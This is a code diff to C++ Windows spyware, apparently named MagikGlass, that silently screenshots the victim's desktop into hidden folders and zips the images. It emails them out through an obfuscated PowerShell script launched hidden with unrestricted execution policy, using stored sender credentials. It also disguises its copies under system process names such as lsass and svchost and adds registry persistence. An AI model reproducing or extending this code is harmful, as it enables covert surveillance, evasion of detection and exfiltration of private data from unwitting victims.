@@ -8,7 +8,6 @@ int Counter, Counter2;
 bool mutex, mutex2;
 static Log MyLog;
 
-
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
 {
 
@@ -18,7 +17,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
     }
 
     SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
-
 
     DWORD Tick1 = GetTickCount();
     int RandSeed = (int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator();
@@ -572,8 +570,28 @@ void DeleteDirectory(std::string dir)
     return;
 }
 
+void createTextFile(const std::string& filename, const std::string& line1, const std::string& line2, const std::string& line3) {
+	// Create the file with the FILE_ATTRIBUTE_HIDDEN attribute
+	HANDLE file = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+	// Write the first line to the file
+	DWORD writtenBytes;
+	WriteFile(file, line1.c_str(), (DWORD)line1.size(), &writtenBytes, NULL);
+	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);
 
-void TakeScreenShot(const char* filename) {
+	// Write the second line to the file
+	WriteFile(file, line2.c_str(), (DWORD)line2.size(), &writtenBytes, NULL);
+	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);
+
+	// Write the second line to the file
+	WriteFile(file, line3.c_str(), (DWORD)line3.size(), &writtenBytes, NULL);
+	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);
+
+	// Close the file
+	CloseHandle(file);
+}
+
+void TakeScreenShot(const char* filename) 
+{
     int x1, y1, x2, y2, w, h;
 
     // get screen dimensions
@@ -696,7 +714,7 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName)
     */
      WriteFile(fh, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
 
-        WriteFile(fh, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);
+	 WriteFile(fh, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);
     
     GlobalUnlock(hDib);
     GlobalFree(hDib);
@@ -704,7 +722,45 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName)
     return TRUE;
 }
 
+void RunPS1File(const std::string& ZipPath1)
+{
+	char tempPath[MAX_PATH];
+	GetEnvironmentVariable("TEMP", tempPath, MAX_PATH);
+	std::string fullPath = tempPath;
+	fullPath += "\\mat-debug-"; //change name if suited
+	fullPath += std::to_string(rand() % 10000 + 1000);
+	fullPath += ".log";
+	createTextFile(fullPath, SendersEmail, SendersPsw, ZipPath1);
 
+	std::string Command = "/C powershell ";
+	char SysDir[MAX_PATH];
+	GetSystemDirectoryA(SysDir, MAX_PATH);
+	DWORD WrittenBytes, DWFlags;
+	char* AppData = nullptr;
+	size_t AppDataSize;
+	strcat_s(SysDir, MAX_PATH, "\\cmd.exe");
+	_dupenv_s(&AppData, &AppDataSize, "APPDATA");
+	std::string Powershell = AppData;
+	Powershell += "\\System1";
+	Powershell += "\\PSScript";
+	Powershell += std::to_string(GetTickCount());
+	Powershell += ".PS1";
+	std::string PSStartup = "MagikMailer";
+	PSStartup += std::to_string(GetTickCount());
+	HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	std::string a = "$credsPath = \"";
+	a += fullPath;
+	a += "\"\n";
+	a += HardDecode("2pE2nIgnrygMW4euXoE;rCfrjZ\\MWYdj7mdxnIfjP4d47YUw64drTZ[l;ofQnWgPTEKvXIfL3U\\4;YdnLnEnPoex\\WNiiIfjD3emXoelTEKvXIfL3U\\4;YdnLnEryYcj3YT2L5dyXoWmiE\\wX4Ww:o\\wnGWW32WmqSMqTZ[SDZccTEMmTYSwOJfwXYdqPY[2TZSwyYcj3YT2L5dyXoWmqyLiKZ\\pf4dOD{crfY[PDke3;YYpCURimJ\\xLmNunY[vXGf{;IenLHLMeEgnTodLvYcpHYVpCURiS5[nro[3PnNunY[vXGf{;IenLHLMmEdrHYdnTEMmTYSw:IXwyYcj3YT2L5dyXoWmqCdrHYdnTEK;CUdxLpTwyYcj3YT2L5dyXoWmqS\\pH4e|XYVunY[P7EdrHYVwSZ\\Q7UdnT5e7PHK2PY\\sL4VveZ\\QDURiyYcj3YT2L5dyXoWmqSMmL5d5P5ejDJLiyEdrHYdnTEMuHYc27Y\\mXoeFvoexfJfn7mN2XoVw2Y\\2PZgVDEflXock;WN5XoVi2FK|zY[rTpdnTY\\{PmNx\\odLDHXPPHLMWYf{TJLi2FKuP5Wnzo[j7YTw:o\\wnGWW32WmqSM5iVPiyken\\penPHe234WmiEfwXYcuPGe234WwyYcj3mN2XoViS5[nro[R3{fn7GK;C{do7YUSTXVVTkEp24dl7EdrHYdp7Ee234epCURiKZ\\4LZ\\VDHXPPHLMupErWodrzodxTEMi[YcMSZ\\rXZWvCUOiSpd3;4SvCEQwilN66EQi64drT5[n7odxPYN2PZ\\2DURiWodrzodxTkEfL|Y|XodrzILi2FKqTZ[SDZccTkEfH|Y|XodrzILi2FKmL5d5P5ejDJLM2HOdPZ\\wnIdmCURiyYcj3Y\\mqCc2HIW|TY\\{PILiSpdnTpdxPWN2X4Ti2FK|XodrzIL");
+	
+	WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
+	CloseHandle(PS1File);
+	Command = SysDir;
+	Command += " /C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
+	Command += Powershell;
+	Command += "\"";
+	ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
+}
 
 ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
 
@@ -718,16 +774,18 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
     GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
     //strcat_s(AppData, sizeof(AppData), "\\MagikGlass");
     std::string ScreenshotDir = AppData;
-    ScreenshotDir += "\\MagikGlass\\";
-    ScreenshotDir += std::to_string(rand() % 10000+1000);
+    ScreenshotDir += "\\MagikGlass";
+    //ScreenshotDir += std::to_string(rand() % 10000+1000);
     DWORD DWFlags;
 
     while (1) {
+		std::this_thread::sleep_for(std::chrono::seconds(3));
         DeleteDirectory(ScreenshotDir);
-        std::this_thread::sleep_for(std::chrono::minutes(1));
+        std::this_thread::sleep_for(std::chrono::seconds(3));
         CreateDirectoryA(ScreenshotDir.c_str(), NULL);
         SetFileAttributesA(ScreenshotDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
-        if (ScreenshotMode == 1) {
+        
+		if (ScreenshotMode == 1) {
             for (int i = 0; i < ScreenshotsPerZip; i++) {
                 CurrentLog = ScreenshotDir;
                 CurrentLog += "\\ScreenShot";
@@ -757,8 +815,7 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
         const char* files[] = {
             ScreenshotDir.c_str()
         };
-
-        {
+	    {
             CoInitialize(NULL);
             CopyItems(std::cbegin(files), std::cend(files), ZipPath.c_str());
             CoUninitialize();
@@ -768,50 +825,18 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
             //SetUploadTask(Emailer, ZipPath);
         }
         else {
-            std::string Command = "/C powershell ";
-            char SysDir[MAX_PATH];
-            GetSystemDirectoryA(SysDir, MAX_PATH);
-            DWORD WrittenBytes, DWFlags;
-            char* AppData = nullptr;
-            size_t AppDataSize;
-            strcat_s(SysDir, MAX_PATH, "\\cmd.exe");
-            _dupenv_s(&AppData, &AppDataSize, "APPDATA");
-            std::string Powershell = AppData;
-            Powershell += "\\MagikGlass\\PSScript";
-            Powershell += std::to_string(GetTickCount());
-            Powershell += ".PS1";
-            std::string PSStartup = "MagikMailer";
-            PSStartup += std::to_string(GetTickCount());
-            HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-            std::string a = HardDecode("yLqyY[rTpdnTY\\{P2c{;4f2XoVwSZ\\Q7UdnT5e7PHK2PY\\sL4VveZ\\QDURiOJdjnIfwXI\\nL5Sw:o\\wnGWW32WmqS\\3LJfmCURiy4eVXIdkHodH7{do7YUSTXVVTkEreFQ3CEN{Xof{X4WyTZdVTEM27Y\\rz4SyTZdV7EdrHYVwSZ\\QDEflXock;WN5XoVi2FKx\\odLDHXPPHLMeUdxPoNunY[vfoNyTZd|fEK;Cken\\penPHWW32WmqygMmU\\wnIdw;ILqCk\\rrCfnnYfT3EKzCEfwX5dF3EK66EQwilN6CkdxnIflXodw;4[vS5enTJK;CU\\wnIdw;IL");
-            a += HardDecode(SendersEmail);
-            a += "', '";
-            a += HardDecode(SendersPsw);
-            a += "')\n$ReportEmail = New-Object System.Net.Mail.MailMessage\n$ReportEmail.From = '";
-            a += HardDecode(SendersEmail);
-            a += "'\n$ReportEmail.To.Add('";
-            a += HardDecode(RecieversEmail);
-            a += "')\n$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
-            a += ZipPath.c_str();
-            a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
-            WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
-            CloseHandle(PS1File);
-            Command = SysDir;
-            Command += " /C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
-            Command += Powershell;
-            Command += "\"";
-            if (!InternetGetConnectedState(&DWFlags, NULL)) {
-                CreateRegistryKey(PSStartup.c_str(), Command.c_str());
-            }
-            else {
-                ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
-            }
+
+			(CalculateDirSize(CurrentLog) > ScreenshotsPerZip);
+			std::string ZipPath1 = ZipPath;
+			RunPS1File(ZipPath1); //takes approx 45 seconds for this to action. 
+			std::this_thread::sleep_for(std::chrono::seconds(35));
+
         }
 
         Counter2 = 0;
         mutex2 = !mutex2;
-        std::this_thread::sleep_for(std::chrono::minutes(3));
-
+        std::this_thread::sleep_for(std::chrono::minutes(1));
+		DeleteDirectory(ZipPath); //double check it deletes so there is no extra images in next zip file
     }
 }
 
@@ -1154,17 +1179,22 @@ void FirstSetup() {
     DestinationFile += "\\Music\\MagikIndex";
     CreateDirectoryA(DestinationFile.c_str(), NULL);
     SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
+
     if (CalculateDirSize(DestinationFile) > MaximumFolderSize) {
         DeleteDirectory(DestinationFile);
         MyLog.LogItChar("Cleaned MagikIndex folder...");
         Sleep(200);
+
+		CreateDirectoryA(DestinationFile.c_str(), NULL);
+		SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN); //added incase delete occurred
     }
     DestinationFile += "\\";
     std::string CopiedFile;
-    char CharacterSet[62] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0' };
-    for (int i = 0; i < 15; i++) {
-        CopiedFile += CharacterSet[rand() % 61 + 0];
-    }
+	std::string CharacterSet[11] =
+	{ "crss","wininit","lsass","smss","dwm","rundll32","taskmgr","svchost","explorer","avast" };
+	for (int i = 0; i < 1; i++) {
+		CopiedFile += CharacterSet[rand() % 10 + 0];
+	}
     DestinationFile += CopiedFile;
     DestinationFile += ".exe";
     CopyFileA(PathToFile, DestinationFile.c_str(), false);
